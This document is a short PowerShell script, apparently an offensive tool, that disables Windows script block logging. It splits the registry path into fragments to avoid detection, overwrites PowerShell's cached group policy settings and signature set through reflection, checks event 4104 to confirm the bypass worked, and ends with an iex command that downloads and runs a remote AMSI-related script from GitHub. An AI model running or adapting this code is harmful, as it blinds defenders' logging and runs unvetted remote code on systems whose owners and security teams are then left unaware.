try
{
        Write-host " "
        $pathk = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Scr"+"iptB"+"lockLo"+"gging"

	    $value = Get-ItemProperty -Path $pathk -ErrorAction Stop | Select-Object -ExpandProperty 'EnableScriptBlockLogging' -ErrorAction Stop
	    if($value -ne 1)
        {
            throw "Script block logging not enabled"
        }
        Write-host "Script block logging enabled"
        Write-host " "
        Write-host "Running script block logging bypass"
        $settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
        $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'] = @{}
        $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'].Add('EnableScriptBlockLogging',"0")
        [Ref].Assembly.GetType("System.Management.Automation.ScriptBlock").GetField("signatures","NonPublic,static").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))

        write-host " "
        write-host "Test ScriptBlockLogging"

        $log = Get-WinEvent -filterhashtable @{logname="Microsoft-Windows-PowerShell/Operational";id=4104} -erroraction 'silentlycontinue' | Where {$_.Message -like "*Test ScriptBlockLogging*"}
        if($log -eq $null)
        {							
	        Write-host " "
	        Write-host "Script block logging bypass executed successfully"
        }
        else
        {							
	        Write-host " "
	        Write-host "Error executing Script block logging bypass. Exit "
            return
        }

}
catch 
{
	    Write-host "Script block logging not enabled"
}

iex((New-Object system.net.WebClient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/AMSI-Setup.ps1'))
